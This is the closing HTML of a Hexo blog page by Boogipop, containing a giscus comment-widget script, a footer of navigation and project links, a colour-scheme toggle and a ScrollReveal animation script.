        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>